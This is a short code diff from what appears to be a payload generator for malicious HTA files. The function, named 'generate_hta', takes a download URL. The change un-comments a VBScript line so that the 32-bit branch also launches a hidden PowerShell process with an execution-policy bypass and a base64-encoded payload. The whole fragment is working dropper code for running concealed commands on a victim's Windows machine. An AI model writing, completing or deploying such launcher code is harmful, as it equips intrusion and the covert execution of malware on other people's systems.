@@ -258,7 +258,7 @@ def generate_hta(DownloadURL, UserAgent, payload_filename_x64, payload_filename_
                 {var4}.Run "powershell.exe -nop -w hidden -Exec Bypass -e {hta_base64_x64}",0
             End If
         Else
-            '{var4}.Run "powershell.exe -nop -w hidden -Exec Bypass -e {hta_base64_x86}",0
+            {var4}.Run "powershell.exe -nop -w hidden -Exec Bypass -e {hta_base64_x86}",0
         End If
       Exit For
     End If
